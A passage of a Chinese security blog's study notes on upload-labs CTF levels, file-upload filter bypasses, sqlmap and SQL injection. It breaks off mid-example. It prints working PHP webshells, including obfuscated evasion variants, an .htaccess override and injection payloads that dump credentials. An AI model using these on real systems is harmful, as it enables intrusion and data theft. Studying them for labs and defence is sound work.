title="Pass-15（getimagesize图片马）"></a>Pass-15（getimagesize图片马）</h3><p>通过使用getimagesize()检查是否为图片文件，所以还是可以用<code>第十四关</code>的图片马绕过，并使用文件包含漏洞解析图片马</p><p>构造的URL为<code>include.php?file=upload/8620210320174003.png</code></p><h3 id="Pass-17（二次渲染绕过）"><a href="#Pass-17（二次渲染绕过）" class="headerlink" title="Pass-17（二次渲染绕过）"></a>Pass-17（二次渲染绕过）</h3><p>对上传图片进行了判断了<code>后缀名</code>、<code>content-type</code>，以及利用<code>imagecreatefromgif</code>判断是否为<code>gif</code>图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接</p><p>上传正常的<code>GIF</code>图片下载回显的图片，用<code>010Editor</code>编辑器进行对比两个GIF图片内容，找到<code>相同</code>的地方（指的是上传前和上传后，两张图片的部分<code>Hex</code>仍然保持不变的位置）并插入PHP一句话，上传带有<code>PHP一句话木马</code>的GIF图片</p><p>利用文件包含漏洞</p><h3 id="Pass-18（条件竞争一）"><a href="#Pass-18（条件竞争一）" class="headerlink" title="Pass-18（条件竞争一）"></a>Pass-18（条件竞争一）</h3><h3 id="Pass-19（条件竞争二）"><a href="#Pass-19（条件竞争二）" class="headerlink" title="Pass-19（条件竞争二）"></a>Pass-19（条件竞争二）</h3>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>upload-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload</title>
    <link href="/2023/04/19/web%E5%AD%A6%E4%B9%A0/upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload/"/>
    <url>/2023/04/19/web%E5%AD%A6%E4%B9%A0/upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload/</url>
    
    <content type="html"><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><h3 id="前端的javascript检测"><a href="#前端的javascript检测" class="headerlink" title="前端的javascript检测"></a>前端的javascript检测</h3><p>该类检测代码直接写在网页中，一般提交后，立即有弹窗提示禁止上传，就可以判断为前端检测，或者直接右键查看页面源代码也能看到javascript的检测代码</p><p>一般的检测手段：文件后缀名检测，文件大小检测</p><p>一般的绕过方法：<br>1禁用前端的javascript检测<br>可以直接将浏览器上的javascript 按键关闭，如果使用的是 Chrome ，firefox浏览器的话可以下载一个插件 Noscript 随时禁止js<br>2直接F12，修改页面中的js检测代码<br>3用burp suite进行中间修改：<br>先写一个一句话木马shell.php，先将文件名修改为允许上传的后缀名（png，gif，jpg），然后再使用burp suite截取数据包，将后缀名修改为 php</p><h3 id="服务端的MIME检测"><a href="#服务端的MIME检测" class="headerlink" title="服务端的MIME检测"></a>服务端的MIME检测</h3><p>根据文件的后缀名决定的，一般有这几种：</p><p>text&#x2F;html ： HTML格式<br>text&#x2F;plain ：纯文本格式<br>text&#x2F;xml ： XML格式<br>image&#x2F;gif ：gif图片格式<br>image&#x2F;jpeg ：jpg图片格式<br>image&#x2F;png：png图片格式<br>application&#x2F;xhtml+xml ：XHTML格式<br>application&#x2F;xml： XML数据格式<br>application&#x2F;atom+xml ：Atom XML聚合格式<br>application&#x2F;json： JSON数据格式<br>application&#x2F;pdf：pdf格式<br>application&#x2F;msword ： Word文档格式<br>application&#x2F;octet-stream ： 二进制流数据（如常见的文件下载）<br>一般的绕过方法：</p><p>1修改multipart&#x2F;form-data，<br>一般文件上传是不会对 headers中的 content-type做限制，因为上传文件的时候它只会是 multipart&#x2F;form-data或者Multipart&#x2F;form-data,但不排除特殊情况，</p><p>2修改content-type<br>一般是利用burp suite进行抓包，然后修改Content-Type为image&#x2F;png,image&#x2F;jpeg,image&#x2F;gif</p><h3 id="服务端的文件后缀名检测："><a href="#服务端的文件后缀名检测：" class="headerlink" title="服务端的文件后缀名检测："></a>服务端的文件后缀名检测：</h3><p>一般的检测手段：<br>黑名单过滤：黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型<br>白名单过滤：仅允许指定的文件类型上传，比如仅允许上传jpg | gif | doc | pdf等类型的文件，其他文件全部禁止</p><h4 id="黑名单："><a href="#黑名单：" class="headerlink" title="黑名单："></a>黑名单：</h4><h5 id="1，大小写绕过"><a href="#1，大小写绕过" class="headerlink" title="1，大小写绕过"></a>1，大小写绕过</h5><p>也可以叫做 列表穷举绕过，原理的是使用 黑名单中不存在并且能正常解析的有害的文件名，如Php，PHp5，等，有时还会忘记一个特别重要的文件后缀 htaccess<br>（可使用爆破快速的检测出到底哪些 文件后缀被过滤了，哪些没有）</p><h5 id="2，特殊文件（-htaccess文件-user-ini文件）的绕过"><a href="#2，特殊文件（-htaccess文件-user-ini文件）的绕过" class="headerlink" title="2，特殊文件（.htaccess文件.user.ini文件）的绕过"></a>2，特殊文件（.htaccess文件.user.ini文件）的绕过</h5><p>.htaccess文件<br>如果发现可以上传.htaccess文件的情况，该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;shell.png&quot;</span>&gt;</span><br> <span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。<br>.user.ini文件<br>php 配置项中有两个配置可以起到一些作用</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file = &lt;filename&gt;         <span class="hljs-comment">//包含在文件头</span><br><span class="hljs-built_in">auto</span>_append_file = &lt;filename&gt;          <span class="hljs-comment">//包含在文件尾</span><br></code></pre></td></tr></table></figure><p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)</p><p>局限<br>在.user.ini 中使用这条配置的使用也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。</p><p>但是有时可以使用 ..&#x2F; 来将文件上传到其他目录，达到一个利用的效果</p><h5 id="3，截断（0x00）绕过"><a href="#3，截断（0x00）绕过" class="headerlink" title="3，截断（0x00）绕过"></a>3，截断（0x00）绕过</h5><p>最常见的截断绕或要数 00 截断了，但是这种情况有很大的局限性，只有在 PHP 版本小于5.3.4 且 magic_quotes_gpc&#x3D;Off时</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Name = <span class="hljs-built_in">getname</span>(http requests)<span class="hljs-comment">//假如这一步获取到的文件名是dama.asp .jpg</span><br>Type = <span class="hljs-built_in">gettype</span>(name)<span class="hljs-comment">//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件</span><br><span class="hljs-function"><span class="hljs-title">If</span><span class="hljs-params">(type == jpg)</span></span><br><span class="hljs-function"><span class="hljs-title">SaveFileToPath</span><span class="hljs-params">(UploadPath.name , name)</span></span><span class="hljs-comment">//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里</span><br></code></pre></td></tr></table></figure><p>（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径&#x2F;upload&#x2F;1.php(0x00)，文件名1.jpg，结合&#x2F;upload&#x2F;1.php(0x00)&#x2F;1.jpg</p><p>Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode</p><p>或者将文件命名为123.php.jpg再在 burp suite 的proxy下 的hex中将 php后面的. 的2e改为 00</p><h5 id="4，利用系统特性绕过"><a href="#4，利用系统特性绕过" class="headerlink" title="4，利用系统特性绕过"></a>4，利用系统特性绕过</h5><p>在Windows系统中</p><h6 id="1）大小写绕过"><a href="#1）大小写绕过" class="headerlink" title="1）大小写绕过"></a>1）大小写绕过</h6><p>没有使用strtolower()函数，可以使用大小写绕过黑名单<br>把.php 格式改为 .Php 上传上去之后，就会自动解析为.php</p><h6 id="2）空格绕过"><a href="#2）空格绕过" class="headerlink" title="2）空格绕过"></a>2）空格绕过</h6><p>没有使用trim()去除空格，可以使用空格绕过黑名单<br>抓包，修改上传一句话木马文件名zoe.php（注意这里有个空格）</p><h6 id="3）点号绕过"><a href="#3）点号绕过" class="headerlink" title="3）点号绕过"></a>3）点号绕过</h6><p>没有使用deldot()过滤文件名末尾的点，可以使用文件名后加.进行绕过<br>抓包，修改上传一句话木马文件名zoe.php.（注意这里有个点）</p><h6 id="4）特殊字符-D-A-T-A-绕过"><a href="#4）特殊字符-D-A-T-A-绕过" class="headerlink" title="4）特殊字符::$D A T A 绕过"></a>4）特殊字符::$D A T A 绕过</h6><p>这一关黑名单，没有对<code>::$D A T A</code> 进 行 处 理 ， 可 以 使 用<code>::$DATA</code>进行绕过，</p><p>补充知识：php在window的时候如果文件名+”<code>::$DATA</code>“会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持”<code>::$DATA</code>“之前的文件名 他的目的就是不检查后缀名。</p><p>上传PHP一句话文件，抓包改后缀<code>zoe.php::$DATA</code><br>然后使用蚁剑连接zoe.php （注意蚁剑连接路径不要加上<code>::$DATA</code>）</p><h6 id="5）后缀加点空格点绕过"><a href="#5）后缀加点空格点绕过" class="headerlink" title="5）后缀加点空格点绕过"></a>5）后缀加点空格点绕过</h6><p>上传路径直接使用文件名进行拼接，而且只对文件名进行file name&#x3D;deldot(file_name)操作去除文件名末尾的点，构造后缀绕过黑名单</p><p>补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</p><p>上传zoe.php 然后用bp改后缀加点空格点（即文件名为zoe.php. .）</p><h6 id="6）双写绕过"><a href="#6）双写绕过" class="headerlink" title="6）双写绕过"></a>6）双写绕过</h6><p>使用str_ireplace()函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p><p>补充知识：str_ireplace(find,replace,string,count) 函数替换字符串中的一些字符（不区分大小写）</p><p>上传zoe.php 然后用bp改后缀为.pphphp使用蚁剑连接zoe.php<br>在Linux系统中，可以尝试上传名为 index.php&#x2F;. 或 .&#x2F;aa&#x2F;..&#x2F;index.php&#x2F;. 的文件</p><p>5，Web Server解析漏洞绕过</p><h4 id="白名单："><a href="#白名单：" class="headerlink" title="白名单："></a>白名单：</h4><h5 id="1，截断（0x00）绕过"><a href="#1，截断（0x00）绕过" class="headerlink" title="1，截断（0x00）绕过"></a>1，截断（0x00）绕过</h5><p>跟黑名单的截断绕过一样，详情参考黑名单的截断绕过</p><h5 id="2，Web-Server解析漏洞绕过"><a href="#2，Web-Server解析漏洞绕过" class="headerlink" title="2，Web Server解析漏洞绕过"></a>2，Web Server解析漏洞绕过</h5><p>跟黑名单的解析漏洞一样</p><h3 id="服务端的文件内容的检测："><a href="#服务端的文件内容的检测：" class="headerlink" title="服务端的文件内容的检测："></a>服务端的文件内容的检测：</h3><h3 id="木马构造（绕过文件内容检测）"><a href="#木马构造（绕过文件内容检测）" class="headerlink" title="木马构造（绕过文件内容检测）"></a>木马构造（绕过文件内容检测）</h3><p>1一般的马儿：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2没有PHP的马儿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>    <br>&lt;% <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);%&gt;<br></code></pre></td></tr></table></figure><p>3有PHP的马儿</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;shell&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4特殊马儿： 过滤[]：用{}代替<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;<span class="hljs-string">&#x27;cmd&#x27;</span>&#125;);<span class="hljs-meta">?&gt;</span><br> 直接拿flag的变形马儿<br><br><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> `tac /<span class="hljs-keyword">var</span>/www/html/f\*`;<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> `tac /<span class="hljs-keyword">var</span>/www/html/f\*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><br>5免杀马儿：<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;s#y#s#t#e#m&quot;</span>;<br><br>       <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$a</span>);<br><br>       <span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">4</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">5</span>]; <br><br>       <span class="hljs-variable">$c</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-string">&#x27;1s&#x27;</span>,<span class="hljs-number">1</span>).<span class="hljs-string">&#x27;ystem&#x27;</span>; <span class="hljs-variable">$a</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>upload文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap使用</title>
    <link href="/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><h3 id="1-输出等级-V"><a href="#1-输出等级-V" class="headerlink" title="1. 输出等级 V"></a>1. 输出等级 V</h3><p>V 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p><p>默认是 1，也可以在命令后指定 -v 3 就是等级 3 的输出。</p><p>0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；<br>1：同时显示普通信息 [INFO] 和警告信息 [WARNING]；<br>2：同时显示调试信息 [DEBUG]；<br>3：同时显示注入使用的攻击荷载；<br>4：同时显示 HTTP 请求；<br>5：同时显示 HTTP 响应头；<br>6：同时显示 HTTP 响应体。</p><h3 id="2-指定目标-U"><a href="#2-指定目标-U" class="headerlink" title="2. 指定目标 U"></a>2. 指定目标 U</h3><p>使用参数 -u 或 –url 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p><p>sqlmap.py -u “<a href="http://www.baidu.com/user.php?id=7">www.baidu.com/user.php?id=7</a>“<br>sqlmap.py -url “<a href="http://www.baidu.com:8080/user.php?id=7">www.baidu.com:8080/user.php?id=7</a>“</p><h3 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 dbs</h3><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 –dbs</p><h3 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 tables</h3><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 -D ‘库名’ –tables</p><h3 id="5-列出表中字段-columns"><a href="#5-列出表中字段-columns" class="headerlink" title="5. 列出表中字段 columns"></a>5. 列出表中字段 columns</h3><p>得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 -D ‘数据库名字’ -T ‘表的名字’ –columns</p><h2 id="SQLMap-的其他命令"><a href="#SQLMap-的其他命令" class="headerlink" title="SQLMap 的其他命令"></a>SQLMap 的其他命令</h2><h3 id="1-level"><a href="#1-level" class="headerlink" title="1. level"></a>1. level</h3><p>刚开始在前面说了，level 算是一共注入测试等级，一共是五级，级别越高，检测的内容也就越多，检测级别大于等于 2 时会检测 cookie 是否有注入，检测级别大于等于 3 时会检测 User-Agent 和 Referer 是否有注入。比较推荐使用 3 等级进行测试。</p><h3 id="2-os"><a href="#2-os" class="headerlink" title="2. os"></a>2. os</h3><p>OS 是检测数据库版本信息的一个命令，但是 SQLMap 默认会自动去检测。</p><h3 id="3-指定注入点"><a href="#3-指定注入点" class="headerlink" title="3. *指定注入点"></a>3. *指定注入点</h3><p>SQLMap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。</p><p>&#x2F;admin&#x2F;1&#x2F; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的： &#x2F;admin.php?id&#x3D;1</p><p>它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。</p><p><code>sqlmap.py -u &quot;www.baidu.com/admin/1*&quot;</code><br>星号之后，众生平等。</p><h3 id="4-POST-数据"><a href="#4-POST-数据" class="headerlink" title="4. POST 数据"></a>4. POST 数据</h3><p>使用参数：-dota</p><p>在 URL 后跟上你要提交的 POST 数据，SQLMap 也会去自动测试。</p><p><code>sqlmap.py -u &quot;http://baidu.com/admin.php&quot; --data=&quot;id=1&amp;name=admin&quot;</code></p><h3 id="5-cookie"><a href="#5-cookie" class="headerlink" title="5. cookie"></a>5. cookie</h3><p>使用参数：-cookie</p><p>这种方式多半来进行 cookie 的注入检测，设置比较繁琐，也可以像我之前所说的直接设置测试等级为 3，会自动测试是否存在 cookie 注入。</p><p><code>sqlmap.py -u &quot;http://baidu.com/admin.php&quot; --cookie &quot;customerId=591edabaab5b52292042df8a&quot;</code></p><h3 id="6-从文件载入-HTTP-请求测试"><a href="#6-从文件载入-HTTP-请求测试" class="headerlink" title="6. 从文件载入 HTTP 请求测试"></a>6. 从文件载入 HTTP 请求测试</h3><p>使用参数：-r</p><p>可以可以理解抓个包下来，获取 HTTP 请求然后保存在文件里，然后让 SQLMap 自己去解析请求来进行注入测试。</p><p>可以从 burp suite 上抓包下来配合 SQLMap 进行联合使用。</p><h3 id="7-Google-搜索进行测试"><a href="#7-Google-搜索进行测试" class="headerlink" title="7. Google 搜索进行测试"></a>7. Google 搜索进行测试</h3><p>使用参数：-g</p><p>SQLMap 会自动爬取谷歌上的搜索结果来进行注入，对带有 GET 参数的 URL 进行挨个测试，前提是你能够科学上网。</p><h3 id="8-超时延迟"><a href="#8-超时延迟" class="headerlink" title="8. 超时延迟"></a>8. 超时延迟</h3><p>使用参数：-timeout</p><p>默认的超时时间是 30 秒，可以使用命令 -timeout 31 来进行修改，比如修改为 31 秒超时。</p><h3 id="9-注入测试的脚本"><a href="#9-注入测试的脚本" class="headerlink" title="9. 注入测试的脚本"></a>9. 注入测试的脚本</h3><p>使用参数：-tamper</p><p>SQLMap 是自带了一个脚本库的，内置的脚本库对 payload 进行了混淆，可能有些可以有效的规避防火墙规则。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sql/"/>
    <url>/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sql/</url>
    
    <content type="html"><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="数字型："><a href="#数字型：" class="headerlink" title="数字型："></a>数字型：</h3><p>当输入的参数为整形时，若存在注入漏洞，则是数字型注入。</p><p>如：<a href="https://blog.csdn.net/aboutus.php?id=1">https://blog.csdn.net/aboutus.php?id=1</a></p><p>此时后台语句：$sql&#x3D;“SELECT 123 FROM abc WHERE id&#x3D;’1 ‘“</p><p>检测方法：URL输入 and 1&#x3D;1 &#x2F; and 1&#x3D;2 报错则说明有注入</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>当输入参数为字符串时，称为字符型注入。</p><p>它与数字型的区别：数字型不需要单引号来闭合，而字符串需要单引号来闭合。</p><p>例：<a href="https://blog.csdn.net/aboutus.php?id=1%E2%80%99">https://blog.csdn.net/aboutus.php?id=1’</a></p><p>此时后台语句：$sql&#x3D;“SELECT 123 FROM abc WHERE id&#x3D;’1 ’ ’ “</p><p>此时多出了一个单引号，破坏了原本的SQL语句结构，数据库无法处理，于是会报错，证明这条语句成功被带进数据库查询,存在字符型注入。</p><p>此时通过 –+把后面的单引号注释掉，SQL语句也会形成闭合。</p><h3 id="联合查询（union注入）"><a href="#联合查询（union注入）" class="headerlink" title="联合查询（union注入）"></a>联合查询（union注入）</h3><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化。</p><p>页面观察<br>输入id&#x3D;1和id&#x3D;2，若页面中值有变化，说明输入与数据库有交互</p><p>注入点判断<br>直接输入?id&#x3D;1’若有报错则存在注入，开始判断可以从哪里注入，?id&#x3D;2’1&#x3D;2–+页面显示不正常，说明此处存在SQL注入，注入点在引号。</p><p>接下来开始使用SQL语句进行攻击。</p><p>使用order by判断当前表的字段个数<br>例：?id&#x3D;1 order by n –+</p><p>若n超过当前表的列数，就会报错，说明表中只有n-1列</p><p>判断显示位<br>判断显示位时，要使用 ?id&#x3D;-1 或者改为0 让前面的select语句查询为空错误，然后采用后面的select语句去查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>观察页面在哪里回显我们的输入，就可以用那个地方测试接下的语句。</p><p>爆数据库的名字</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>在之前回显2的地方会回显database数据库的名字。</p><p>爆数据库中的表</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() --+<br></code></pre></td></tr></table></figure><p>爆表中的字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.column where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;爆出来的数据库名&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;爆出来的表名&#x27;</span> --+<br></code></pre></td></tr></table></figure><p>爆相应字段的所有数据</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(id,<span class="hljs-string">&#x27;–&#x27;</span>,username,<span class="hljs-string">&#x27;–&#x27;</span>,password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>在mysql中使用指定函数来制造报错，查询的时候加一些格式错误的信息，它会提示你格式错误，可以在中间加入一些其他信息，比如select database(),报错信息后面也会出现数据库信息.</p><ol><li><p>group by 重复键冲</p> <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat((<span class="hljs-keyword">select</span> 查询的内容 <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),floor(rand()*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">table</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li><li><p>extractvalue() 函数</p><p> extractvalue(xml_frag,xpath_expr)；</p><p> 函数接受两个参数，第一个为XML标记内容，也就是查询的内容，第二个为XPATH路径，也就是查询的路径。</p><p> 如果没有匹配的内容，不管出于何种原因，只要路径有效并且查询的内容由正确嵌套和关闭的元素组成，返回空字符串。</p><p> 但如果路径写入错误格式，就会报错并且返回我们写入的非法内容。</p> <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&#x27;^&#x27;</span>)) *<span class="hljs-comment">--+//获取数据库名字*</span><br></code></pre></td></tr></table></figure></li><li><p>updatexml() 函数</p><p> updatexml(xml_target,xpath_expr,new_xml)；</p><p> 此函数将XML标记的给定片段的单个部分替换为xml_target新的XML片段new_xml，然后返回更改的XML。</p><p> xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。</p><p> 所有三个参数都应该是字符串。与extractvalue()类似，如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。</p><p> and updatexml(1,concat(‘^’,(需要查询的内容),’^’),1)</p></li></ol><p>获取数据库名字</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(database()),<span 